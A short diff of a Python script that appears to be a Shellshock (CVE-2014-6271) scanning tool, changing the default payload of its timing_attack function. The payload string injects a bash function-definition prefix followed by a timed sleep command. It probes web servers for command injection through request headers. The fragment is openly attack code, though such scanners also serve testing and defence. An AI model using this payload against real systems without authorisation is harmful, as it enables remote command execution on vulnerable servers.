@@ -6,7 +6,7 @@ import string
 
 randstr = lambda n: ''.join(random.choice(string.ascii_letters + string.digits) for i in xrange(n))
 
-def timing_attack(url, request_type="HEAD", data=None, headers=None, sleeptime = 3, cmd='() { :;}; env PATH="/bin:/usr/bin:/usr/local/bin:$PATH" sleep %f'):
+def timing_attack(url, request_type="HEAD", data=None, headers=None, sleeptime = 3, cmd='() { :;}; PATH="/bin:/usr/bin:/usr/local/bin:$PATH" sleep %f'):
     request_type = request_type.upper()
     if request_type not in ("HEAD", "GET", "POST"):
         raise Exception("Illegal request type '%s'" % request_type)
